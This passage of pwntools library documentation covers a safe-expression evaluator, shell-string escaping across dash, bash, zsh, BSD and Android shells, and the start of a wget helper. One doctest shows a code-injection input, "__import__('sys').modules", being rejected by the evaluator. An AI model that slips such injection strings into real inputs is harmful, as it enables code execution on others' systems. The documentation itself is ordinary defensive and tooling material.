<dl class="function">
<dt id="pwnlib.util.safeeval.expr">
<code class="descclassname">pwnlib.util.safeeval.</code><code class="descname">expr</code><span class="sig-paren">(</span><em>expression</em><span class="sig-paren">)</span> &#x2192; value<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/safeeval.py#L83-105"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.safeeval.expr" title="Permalink to this definition">¶</a></dt>
<dd><p>Safe Python expression evaluation</p>
<p>Evaluates a string that contains an expression that only
uses Python constants. This can be used to e.g. evaluate
a numerical expression from an untrusted source.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">expr</span><span class="p">(</span><span class="s2">&quot;1+2&quot;</span><span class="p">)</span>
<span class="go">3</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">expr</span><span class="p">(</span><span class="s2">&quot;[1,2]*2&quot;</span><span class="p">)</span>
<span class="go">[1, 2, 1, 2]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">expr</span><span class="p">(</span><span class="s2">&quot;__import__(&#39;sys&#39;).modules&quot;</span><span class="p">)</span>
<span class="gt">Traceback (most recent call last):</span>
<span class="c">...</span>
<span class="gr">ValueError</span>: <span class="n">opcode LOAD_NAME not allowed</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.safeeval.test_expr">
<code class="descclassname">pwnlib.util.safeeval.</code><code class="descname">test_expr</code><span class="sig-paren">(</span><em>expr</em>, <em>allowed_codes</em><span class="sig-paren">)</span> &#x2192; codeobj<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/safeeval.py#L40-57"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.safeeval.test_expr" title="Permalink to this definition">¶</a></dt>
<dd><p>Test that the expression contains only the listed opcodes.
If the expression is valid and contains only allowed codes,
return the compiled code object. Otherwise raise a ValueError</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.safeeval.values">
<code class="descclassname">pwnlib.util.safeeval.</code><code class="descname">values</code><span class="sig-paren">(</span><em>expression</em>, <em>dict</em><span class="sig-paren">)</span> &#x2192; value<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/safeeval.py#L107-141"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.safeeval.values" title="Permalink to this definition">¶</a></dt>
<dd><p>Safe Python expression evaluation</p>
<p>Evaluates a string that contains an expression that only
uses Python constants and values from a supplied dictionary.
This can be used to e.g. evaluate e.g. an argument to a syscall.</p>
<dl class="docutils">
<dt>Note: This is potentially unsafe if e.g. the __add__ method has side</dt>
<dd>effects.</dd>
</dl>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">values</span><span class="p">(</span><span class="s2">&quot;A + 4&quot;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;A&#39;</span><span class="p">:</span> <span class="mi">6</span><span class="p">})</span>
<span class="go">10</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">class</span> <span class="nc">Foo</span><span class="p">:</span>
<span class="gp">... </span>   <span class="k">def</span> <span class="nf">__add__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">other</span><span class="p">):</span>
<span class="gp">... </span>       <span class="nb">print</span> <span class="s2">&quot;Firing the missiles&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">values</span><span class="p">(</span><span class="s2">&quot;A + 1&quot;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;A&#39;</span><span class="p">:</span> <span class="n">Foo</span><span class="p">()})</span>
<span class="go">Firing the missiles</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">values</span><span class="p">(</span><span class="s2">&quot;A.x&quot;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;A&#39;</span><span class="p">:</span> <span class="n">Foo</span><span class="p">()})</span>
<span class="gt">Traceback (most recent call last):</span>
<span class="c">...</span>
<span class="gr">ValueError</span>: <span class="n">opcode LOAD_ATTR not allowed</span>
</pre></div>
</div>
</dd></dl>

</div>
<span id="document-util/sh_string"></span><div class="section" id="module-pwnlib.util.sh_string">
<span id="pwnlib-util-sh-string-shell-expansion-is-hard"></span><h3><a class="reference internal" href="#module-pwnlib.util.sh_string" title="pwnlib.util.sh_string"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.util.sh_string</span></code></a> &#8212; Shell Expansion is Hard<a class="headerlink" href="#module-pwnlib.util.sh_string" title="Permalink to this headline">¶</a></h3>
<p>Routines here are for getting any NULL-terminated sequence of bytes evaluated
intact by any shell.  This includes all variants of quotes, whitespace, and
non-printable characters.</p>
<div class="section" id="supported-shells">
<h4>Supported Shells<a class="headerlink" href="#supported-shells" title="Permalink to this headline">¶</a></h4>
<p>The following shells have been evaluated:</p>
<ul class="simple">
<li>Ubuntu (dash/sh)</li>
<li>MacOS (GNU Bash)</li>
<li>Zsh</li>
<li>FreeBSD (sh)</li>
<li>OpenBSD (sh)</li>
<li>NetBSD (sh)</li>
</ul>
<div class="section" id="debian-almquist-shell-dash">
<h5>Debian Almquist shell (Dash)<a class="headerlink" href="#debian-almquist-shell-dash" title="Permalink to this headline">¶</a></h5>
<p>Ubuntu 14.04 and 16.04 use the Dash shell, and /bin/sh is actually just a
symlink to /bin/dash.  The feature set supported when invoked as &#8220;sh&#8221; instead
of &#8220;dash&#8221; is different, and we focus exclusively on the &#8220;/bin/sh&#8221; implementation.</p>
<p>From the <a class="reference external" href="http://manpages.ubuntu.com/manpages/trusty/man1/dash.1.html">Ubuntu Man Pages</a>, every character except for single-quote
can be wrapped in single-quotes, and a backslash can be used to escape unquoted
single-quotes.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>Quoting
  Quoting is used to remove the special meaning of certain characters or
  words to the shell, such as operators, whitespace, or keywords.  There
  are three types of quoting: matched single quotes, matched double quotes,
  and backslash.

Backslash
  A backslash preserves the literal meaning of the following character,
  with the exception of ⟨newline⟩.  A backslash preceding a ⟨newline⟩ is
  treated as a line continuation.

Single Quotes
  Enclosing characters in single quotes preserves the literal meaning of
  all the characters (except single quotes, making it impossible to put
  single-quotes in a single-quoted string).

Double Quotes
  Enclosing characters within double quotes preserves the literal meaning
  of all characters except dollarsign ($), backquote (`), and backslash
  (\).  The backslash inside double quotes is historically weird, and
  serves to quote only the following characters:
        $ ` &quot; \ &lt;newline&gt;.
  Otherwise it remains literal.
</pre></div>
</div>
</div>
<div class="section" id="gnu-bash">
<h5>GNU Bash<a class="headerlink" href="#gnu-bash" title="Permalink to this headline">¶</a></h5>
<p>The Bash shell is default on many systems, though it is not generally the default
system-wide shell (i.e., the <cite>system</cite> syscall does not generally invoke it).</p>
<p>That said, its prevalence suggests that it also be addressed.</p>
<p>From the <a class="reference external" href="https://www.gnu.org/software/bash/manual/bash.html#Quoting">GNU Bash Manual</a>, every character except for single-quote
can be wrapped in single-quotes, and a backslash can be used to escape unquoted
single-quotes.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>3.1.2.1 Escape Character

A non-quoted backslash ‘\’ is the Bash escape character. It preserves the
literal value of the next character that follows, with the exception of
newline. If a ``\newline`` pair appears, and the backslash itself is not
quoted, the ``\newline`` is treated as a line continuation (that is, it
is removed from the input stream and effectively ignored).

3.1.2.2 Single Quotes

Enclosing characters in single quotes (‘&#39;’) preserves the literal value of
each character within the quotes. A single quote may not occur between single
uotes, even when preceded by a backslash.

3.1.2.3 Double Quotes

Enclosing characters in double quotes (‘&quot;’) preserves the literal value of a
ll characters within the quotes, with the exception of ‘$’, ‘`’, ‘\’, and,
when history expansion is enabled, ‘!’. The characters ‘$’ and ‘`’ retain their
pecial meaning within double quotes (see Shell Expansions). The backslash retains
its special meaning only when followed by one of the following characters:
‘$’, ‘`’, ‘&quot;’, ‘\’, or newline. Within double quotes, backslashes that are
followed by one of these characters are removed. Backslashes preceding
characters without a special meaning are left unmodified. A double quote may
be quoted within double quotes by preceding it with a backslash. If enabled,
history expansion will be performed unless an ‘!’ appearing in double quotes
is escaped using a backslash. The backslash preceding the ‘!’ is not removed.

The special parameters ‘*’ and ‘@’ have special meaning when in double quotes
see Shell Parameter Expansion).
</pre></div>
</div>
</div>
<div class="section" id="z-shell">
<h5>Z Shell<a class="headerlink" href="#z-shell" title="Permalink to this headline">¶</a></h5>
<p>The Z shell is also a relatively common user shell, even though it&#8217;s not generally
the default system-wide shell.</p>
<p>From the <a class="reference external" href="http://zsh.sourceforge.net/Doc/Release/Shell-Grammar.html#Quoting">Z Shell Manual</a>, every character except for single-quote
can be wrapped in single-quotes, and a backslash can be used to escape unquoted
single-quotes.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>A character may be quoted (that is, made to stand for itself) by preceding
it with a ‘\’. ‘\’ followed by a newline is ignored.

A string enclosed between ‘$&#39;’ and ‘&#39;’ is processed the same way as the
string arguments of the print builtin, and the resulting string is considered
o be entirely quoted. A literal ‘&#39;’ character can be included in the string
by using the ‘\&#39;’ escape.

All characters enclosed between a pair of single quotes (&#39;&#39;) that is not
preceded by a ‘$’ are quoted. A single quote cannot appear within single
quotes unless the option RC_QUOTES is set, in which case a pair of single
quotes are turned into a single quote. For example,

print &#39;&#39;&#39;&#39;
outputs nothing apart from a newline if RC_QUOTES is not set, but one single
quote if it is set.

Inside double quotes (&quot;&quot;), parameter and command substitution occur, and
‘\’ quotes the characters ‘\’, ‘`’, ‘&quot;’, and ‘$’.
</pre></div>
</div>
</div>
<div class="section" id="freebsd-shell">
<h5>FreeBSD Shell<a class="headerlink" href="#freebsd-shell" title="Permalink to this headline">¶</a></h5>
<p>Compatibility with the FreeBSD shell is included for completeness.</p>
<p>From the <a class="reference external" href="https://www.freebsd.org/cgi/man.cgi?query=sh">FreeBSD man pages</a>, every character except for single-quote
can be wrapped in single-quotes, and a backslash can be used to escape unquoted
single-quotes.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>Quoting is used to remove the special meaning of certain characters or
words to the shell, such as operators, whitespace, keywords, or alias
names.

There are four types of quoting: matched single quotes, dollar-single
quotes, matched double quotes, and backslash.

Single Quotes
    Enclosing characters in single quotes preserves the literal mean-
    ing of all the characters (except single quotes, making it impos-
    sible to put single-quotes in a single-quoted string).

Dollar-Single Quotes
    Enclosing characters between $&#39; and &#39; preserves the literal mean-
    ing of all characters except backslashes and single quotes.  A
    backslash introduces a C-style escape sequence:

    ...

Double Quotes
    Enclosing characters within double quotes preserves the literal
    meaning of all characters except dollar sign (`$&#39;), backquote
    (``&#39;), and backslash (`\&#39;).  The backslash inside double quotes
    is historically weird.  It remains literal unless it precedes the
    following characters, which it serves to quote:

      $     `     &quot;     \     \n

Backslash
    A backslash preserves the literal meaning of the following char-
    acter, with the exception of the newline character (`\n&#39;).  A
    backslash preceding a newline is treated as a line continuation.
</pre></div>
</div>
</div>
<div class="section" id="openbsd-shell">
<h5>OpenBSD Shell<a class="headerlink" href="#openbsd-shell" title="Permalink to this headline">¶</a></h5>
<p>From the <a class="reference external" href="http://man.openbsd.org/cgi-bin/man.cgi?query=sh#SHELL_GRAMMAR">OpenBSD Man Pages</a>, every character except for single-quote
can be wrapped in single-quotes, and a backslash can be used to escape unquoted
single-quotes.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>A backslash (\) can be used to quote any character except a newline.
If a newline follows a backslash the shell removes them both, effectively
making the following line part of the current one.

A group of characters can be enclosed within single quotes (&#39;) to quote
every character within the quotes.

A group of characters can be enclosed within double quotes (&quot;) to quote
every character within the quotes except a backquote (`) or a dollar
sign ($), both of which retain their special meaning. A backslash (\)
within double quotes retains its special meaning, but only when followed
by a backquote, dollar sign, double quote, or another backslash.
An at sign (@) within double quotes has a special meaning
(see SPECIAL PARAMETERS, below).
</pre></div>
</div>
</div>
<div class="section" id="netbsd-shell">
<h5>NetBSD Shell<a class="headerlink" href="#netbsd-shell" title="Permalink to this headline">¶</a></h5>
<p>The NetBSD shell&#8217;s documentation is identical to the Dash documentation.</p>
</div>
<div class="section" id="android-shells">
<h5>Android Shells<a class="headerlink" href="#android-shells" title="Permalink to this headline">¶</a></h5>
<p>Android has gone through some number of shells.</p>
<ul class="simple">
<li>Mksh, a Korn shell, was used with Toolbox releases (5.0 and prior)</li>
<li>Toybox, also derived from the Almquist Shell (6.0 and newer)</li>
</ul>
<p>Notably, the Toolbox implementation is not POSIX compliant
as it lacks a &#8220;printf&#8221; builtin (e.g. Android 5.0 emulator images).</p>
</div>
<div class="section" id="toybox-shell">
<h5>Toybox Shell<a class="headerlink" href="#toybox-shell" title="Permalink to this headline">¶</a></h5>
<p>Android 6.0 (and possibly other versions) use a shell based on <code class="docutils literal"><span class="pre">toybox</span></code>.</p>
<p>While it does not include a <code class="docutils literal"><span class="pre">printf</span></code> builtin, <code class="docutils literal"><span class="pre">toybox</span></code> itself includes
a POSIX-compliant <code class="docutils literal"><span class="pre">printf</span></code> binary.</p>
<p>The Ash shells should be feature-compatible with <code class="docutils literal"><span class="pre">dash</span></code>.</p>
</div>
<div class="section" id="busybox-shell">
<h5>BusyBox Shell<a class="headerlink" href="#busybox-shell" title="Permalink to this headline">¶</a></h5>
<p><a class="reference external" href="https://en.wikipedia.org/wiki/BusyBox#Features">BusyBox&#8217;s Wikipedia page</a> claims to use an <code class="docutils literal"><span class="pre">ash</span></code>-compliant shell,
and should therefore be compatible with <code class="docutils literal"><span class="pre">dash</span></code>.</p>
<dl class="function">
<dt id="pwnlib.util.sh_string.sh_command_with">
<code class="descclassname">pwnlib.util.sh_string.</code><code class="descname">sh_command_with</code><span class="sig-paren">(</span><em>f</em>, <em>arg0</em>, <em>...</em>, <em>argN</em><span class="sig-paren">)</span> &#x2192; command<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/sh_string.py#L476-513"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.sh_string.sh_command_with" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns a command create by evaluating <cite>f(new_arg0, ..., new_argN)</cite>
whenever <cite>f</cite> is a function and <cite>f % (new_arg0, ..., new_argN)</cite> otherwise.</p>
<p>If the arguments are purely alphanumeric, then they are simply passed to
function. If they are simple to escape, they will be escaped and passed to
the function.</p>
<p>If the arguments contain trailing newlines, then it is hard to use them
directly because of a limitation in the posix shell. In this case the
output from <cite>f</cite> is prepended with a bit of code to create the variables.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">sh_command_with</span><span class="p">(</span><span class="k">lambda</span><span class="p">:</span> <span class="s2">&quot;echo hello&quot;</span><span class="p">)</span>
<span class="go">&#39;echo hello&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh_command_with</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="s2">&quot;echo &quot;</span> <span class="o">+</span> <span class="n">x</span><span class="p">,</span> <span class="s2">&quot;hello&quot;</span><span class="p">)</span>
<span class="go">&#39;echo hello&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh_command_with</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="s2">&quot;/bin/echo &quot;</span> <span class="o">+</span> <span class="n">x</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\\</span><span class="s2">x01&quot;</span><span class="p">)</span>
<span class="go">&quot;/bin/echo &#39;\\x01&#39;&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh_command_with</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="s2">&quot;/bin/echo &quot;</span> <span class="o">+</span> <span class="n">x</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\\</span><span class="s2">x01</span><span class="se">\\</span><span class="s2">n&quot;</span><span class="p">)</span>
<span class="go">&quot;/bin/echo &#39;\\x01\\n&#39;&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh_command_with</span><span class="p">(</span><span class="s2">&quot;/bin/echo </span><span class="si">%s</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\\</span><span class="s2">x01</span><span class="se">\\</span><span class="s2">n&quot;</span><span class="p">)</span>
<span class="go">&quot;/bin/echo &#39;\\x01\\n&#39;&quot;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.sh_string.sh_prepare">
<code class="descclassname">pwnlib.util.sh_string.</code><code class="descname">sh_prepare</code><span class="sig-paren">(</span><em>variables</em>, <em>export=False</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/sh_string.py#L427-474"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.sh_string.sh_prepare" title="Permalink to this definition">¶</a></dt>
<dd><p>Outputs a posix compliant shell command that will put the data specified
by the dictionary into the environment.</p>
<p>It is assumed that the keys in the dictionary are valid variable names that
does not need any escaping.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>variables</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><em>dict</em></a>) &#8211; The variables to set.</li>
<li><strong>export</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Should the variables be exported or only stored in the shell environment?</li>
<li><strong>output</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; A valid posix shell command that will set the given variables.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p>It is assumed that <cite>var</cite> is a valid name for a variable in the shell.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">sh_prepare</span><span class="p">({</span><span class="s1">&#39;X&#39;</span><span class="p">:</span> <span class="s1">&#39;foobar&#39;</span><span class="p">})</span>
<span class="go">&#39;X=foobar&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">r</span> <span class="o">=</span> <span class="n">sh_prepare</span><span class="p">({</span><span class="s1">&#39;X&#39;</span><span class="p">:</span> <span class="s1">&#39;foobar&#39;</span><span class="p">,</span> <span class="s1">&#39;Y&#39;</span><span class="p">:</span> <span class="s1">&#39;cookies&#39;</span><span class="p">})</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">r</span> <span class="o">==</span> <span class="s1">&#39;X=foobar;Y=cookies&#39;</span> <span class="ow">or</span> <span class="n">r</span> <span class="o">==</span> <span class="s1">&#39;Y=cookies;X=foobar&#39;</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh_prepare</span><span class="p">({</span><span class="s1">&#39;X&#39;</span><span class="p">:</span> <span class="s1">&#39;foo bar&#39;</span><span class="p">})</span>
<span class="go">&quot;X=&#39;foo bar&#39;&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh_prepare</span><span class="p">({</span><span class="s1">&#39;X&#39;</span><span class="p">:</span> <span class="s2">&quot;foo&#39;bar&quot;</span><span class="p">})</span>
<span class="go">&quot;X=&#39;foo&#39;\\&#39;&#39;bar&#39;&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh_prepare</span><span class="p">({</span><span class="s1">&#39;X&#39;</span><span class="p">:</span> <span class="s2">&quot;foo</span><span class="se">\\\\</span><span class="s2">bar&quot;</span><span class="p">})</span>
<span class="go">&quot;X=&#39;foo\\\\bar&#39;&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh_prepare</span><span class="p">({</span><span class="s1">&#39;X&#39;</span><span class="p">:</span> <span class="s2">&quot;foo</span><span class="se">\\\\</span><span class="s2">&#39;bar&quot;</span><span class="p">})</span>
<span class="go">&quot;X=&#39;foo\\\\&#39;\\&#39;&#39;bar&#39;&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh_prepare</span><span class="p">({</span><span class="s1">&#39;X&#39;</span><span class="p">:</span> <span class="s2">&quot;foo</span><span class="se">\\</span><span class="s2">x01&#39;bar&quot;</span><span class="p">})</span>
<span class="go">&quot;X=&#39;foo\\x01&#39;\\&#39;&#39;bar&#39;&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh_prepare</span><span class="p">({</span><span class="s1">&#39;X&#39;</span><span class="p">:</span> <span class="s2">&quot;foo</span><span class="se">\\</span><span class="s2">x01&#39;bar&quot;</span><span class="p">},</span> <span class="n">export</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
<span class="go">&quot;export X=&#39;foo\\x01&#39;\\&#39;&#39;bar&#39;&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh_prepare</span><span class="p">({</span><span class="s1">&#39;X&#39;</span><span class="p">:</span> <span class="s2">&quot;foo</span><span class="se">\\</span><span class="s2">x01&#39;bar</span><span class="se">\\</span><span class="s2">n&quot;</span><span class="p">})</span>
<span class="go">&quot;X=&#39;foo\\x01&#39;\\&#39;&#39;bar\\n&#39;&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh_prepare</span><span class="p">({</span><span class="s1">&#39;X&#39;</span><span class="p">:</span> <span class="s2">&quot;foo</span><span class="se">\\</span><span class="s2">x01&#39;bar</span><span class="se">\\</span><span class="s2">n&quot;</span><span class="p">})</span>
<span class="go">&quot;X=&#39;foo\\x01&#39;\\&#39;&#39;bar\\n&#39;&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh_prepare</span><span class="p">({</span><span class="s1">&#39;X&#39;</span><span class="p">:</span> <span class="s2">&quot;foo</span><span class="se">\\</span><span class="s2">x01&#39;bar</span><span class="se">\\</span><span class="s2">n&quot;</span><span class="p">},</span> <span class="n">export</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
<span class="go">&quot;export X=&#39;foo\\x01&#39;\\&#39;&#39;bar\\n&#39;&quot;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.sh_string.sh_string">
<code class="descclassname">pwnlib.util.sh_string.</code><code class="descname">sh_string</code><span class="sig-paren">(</span><em>s</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/sh_string.py#L359-425"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.sh_string.sh_string" title="Permalink to this definition">¶</a></dt>
<dd><p>Outputs a string in a format that will be understood by /bin/sh.</p>
<p>If the string does not contain any bad characters, it will simply be
returned, possibly with quotes. If it contains bad characters, it will
be escaped in a way which is compatible with most known systems.</p>
<div class="admonition warning">
<p class="first admonition-title">Warning</p>
<p class="last">This does not play along well with the shell&#8217;s built-in &#8220;echo&#8221;.
It works exactly as expected to set environment variables and
arguments, <strong>unless</strong> it&#8217;s the shell-builtin echo.</p>
</div>
<dl class="docutils">
<dt>Argument:</dt>
<dd>s(str): String to escape.</dd>
</dl>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">sh_string</span><span class="p">(</span><span class="s1">&#39;foobar&#39;</span><span class="p">)</span>
<span class="go">&#39;foobar&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh_string</span><span class="p">(</span><span class="s1">&#39;foo bar&#39;</span><span class="p">)</span>
<span class="go">&quot;&#39;foo bar&#39;&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh_string</span><span class="p">(</span><span class="s2">&quot;foo&#39;bar&quot;</span><span class="p">)</span>
<span class="go">&quot;&#39;foo&#39;\\&#39;&#39;bar&#39;&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh_string</span><span class="p">(</span><span class="s2">&quot;foo</span><span class="se">\\\\</span><span class="s2">bar&quot;</span><span class="p">)</span>
<span class="go">&quot;&#39;foo\\\\bar&#39;&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh_string</span><span class="p">(</span><span class="s2">&quot;foo</span><span class="se">\\\\</span><span class="s2">&#39;bar&quot;</span><span class="p">)</span>
<span class="go">&quot;&#39;foo\\\\&#39;\\&#39;&#39;bar&#39;&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh_string</span><span class="p">(</span><span class="s2">&quot;foo</span><span class="se">\\</span><span class="s2">x01&#39;bar&quot;</span><span class="p">)</span>
<span class="go">&quot;&#39;foo\\x01&#39;\\&#39;&#39;bar&#39;&quot;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.sh_string.test">
<code class="descclassname">pwnlib.util.sh_string.</code><code class="descname">test</code><span class="sig-paren">(</span><em>original</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/sh_string.py#L279-341"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.sh_string.test" title="Permalink to this definition">¶</a></dt>
<dd><p>Tests the output provided by a shell interpreting a string</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">test</span><span class="p">(</span><span class="s1">&#39;foobar&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">test</span><span class="p">(</span><span class="s1">&#39;foo bar&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">test</span><span class="p">(</span><span class="s1">&#39;foo bar</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">test</span><span class="p">(</span><span class="s2">&quot;foo&#39;bar&quot;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">test</span><span class="p">(</span><span class="s2">&quot;foo</span><span class="se">\\\\</span><span class="s2">bar&quot;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">test</span><span class="p">(</span><span class="s2">&quot;foo</span><span class="se">\\\\</span><span class="s2">&#39;bar&quot;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">test</span><span class="p">(</span><span class="s2">&quot;foo</span><span class="se">\\</span><span class="s2">x01&#39;bar&quot;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">test</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">test</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xff</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">test</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">16</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">))</span>
</pre></div>
</div>
</dd></dl>

</div>
</div>
</div>
<span id="document-util/web"></span><div class="section" id="module-pwnlib.util.web">
<span id="pwnlib-util-web-utilities-for-working-with-the-www"></span><h3><a class="reference internal" href="#module-pwnlib.util.web" title="pwnlib.util.web"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.util.web</span></code></a> &#8212; Utilities for working with the WWW<a class="headerlink" href="#module-pwnlib.util.web" title="Permalink to this headline">¶</a></h3>
<dl class="function">
<dt id="pwnlib.util.web.wget">
<code class="descclassname">pwnlib.util.web.</code><code class="descname">wget</code><span class="sig-paren">(</span><em>url</em>, <em>save=None</em>, <em>timeout=5</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/web.py#L13-78"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.web.wget" title="Permalink to this definition">¶</a></dt>
<dd><p>Downloads a file via HTTP/HTTPS.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>url</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; URL to download</li>
<li><strong>save</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a><em> or </em><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Name to save as.  Any truthy value
will auto-generate a name based on the URL.</li>
<li><strong>timeout</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Timeout, in seconds</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">url</span>    <span class="o">=</span> <span class="s1">&#39;https://httpbin.org/robots.txt&#39;</span>
